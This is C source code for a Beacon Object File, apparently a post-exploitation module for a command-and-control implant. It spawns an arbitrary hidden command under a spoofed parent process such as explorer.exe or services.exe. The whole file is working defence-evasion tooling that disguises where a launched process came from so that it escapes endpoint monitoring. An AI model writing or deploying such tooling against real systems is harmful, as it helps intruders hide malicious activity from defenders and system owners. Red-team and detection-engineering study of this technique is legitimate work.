/*
 * bof-ppidspoof <parent-pid> <command> [args...]
 *
 * Spawn a process whose parent is the given PID, using
 * PROC_THREAD_ATTRIBUTE_PARENT_PROCESS.  Useful for making a child appear to
 * belong to explorer.exe / services.exe.  The handle must be openable with
 * PROCESS_CREATE_PROCESS; system-owned parents need elevated rights.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

void go(char *args, int alen)
{
    datap parser;
    int parent_pid = 0;
    char *command, *extra = "";
    int clen = 0, elen = 0;
    char cmdline[2048];
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    LPPROC_THREAD_ATTRIBUTE_LIST attrs = NULL;
    SIZE_T size = 0;
    HANDLE hp;
    BOOL ok;

    BeaconDataParse(&parser, args, alen);
    parent_pid = BeaconDataInt(&parser);
    command = BeaconDataExtract(&parser, &clen);
    extra   = BeaconDataExtract(&parser, &elen);
    if (parent_pid <= 0 || !command || !command[0]) {
        BeaconPrintf(CALLBACK_ERROR,
                     "usage: ppidspoof <parent-pid> <command> [args]\n");
        return;
    }
    if (!extra) extra = "";

    bof_strncpy(cmdline, command, sizeof(cmdline));
    if (extra[0]) {
        bof_strncat(cmdline, " ", sizeof(cmdline) - bof_strlen(cmdline) - 1);
        bof_strncat(cmdline, extra, sizeof(cmdline) - bof_strlen(cmdline) - 1);
    }

    hp = KERNEL32$OpenProcess(PROCESS_CREATE_PROCESS, FALSE, (DWORD)parent_pid);
    if (!hp) {
        hp = KERNEL32$OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)parent_pid);
    }
    if (!hp) {
        BeaconPrintf(CALLBACK_ERROR, "OpenProcess(%d) failed: %lu\n",
                     parent_pid, (unsigned long)KERNEL32$GetLastError());
        return;
    }

    bof_memzero(&si, sizeof(si));
    si.StartupInfo.cb = sizeof(si);
    bof_memzero(&pi, sizeof(pi));

    KERNEL32$InitializeProcThreadAttributeList(NULL, 1, 0, &size);
    attrs = (LPPROC_THREAD_ATTRIBUTE_LIST)KERNEL32$VirtualAlloc(
                NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!attrs) {
        BeaconPrintf(CALLBACK_ERROR, "attribute list alloc failed\n");
        KERNEL32$CloseHandle(hp);
        return;
    }
    if (!KERNEL32$InitializeProcThreadAttributeList(attrs, 1, 0, &size)) {
        BeaconPrintf(CALLBACK_ERROR, "InitializeProcThreadAttributeList: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        KERNEL32$VirtualFree(attrs, 0, MEM_RELEASE);
        KERNEL32$CloseHandle(hp);
        return;
    }
    if (!KERNEL32$UpdateProcThreadAttribute(
            attrs, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
            &hp, sizeof(hp), NULL, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "UpdateProcThreadAttribute: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
        KERNEL32$DeleteProcThreadAttributeList(attrs);
        KERNEL32$VirtualFree(attrs, 0, MEM_RELEASE);
        KERNEL32$CloseHandle(hp);
        return;
    }

    si.lpAttributeList = attrs;

    ok = KERNEL32$CreateProcessA(NULL, cmdline, NULL, NULL, FALSE,
                                 EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
                                 NULL, NULL, (LPSTARTUPINFOA)&si, &pi);
    if (ok) {
        BeaconPrintf(CALLBACK_OUTPUT,
                     "[+] %s -> PID %lu (spoofed parent %d)\n",
                     cmdline, (unsigned long)pi.dwProcessId, parent_pid);
        KERNEL32$CloseHandle(pi.hThread);
        KERNEL32$CloseHandle(pi.hProcess);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "CreateProcess failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
    }

    KERNEL32$DeleteProcThreadAttributeList(attrs);
    KERNEL32$VirtualFree(attrs, 0, MEM_RELEASE);
    KERNEL32$CloseHandle(hp);
}
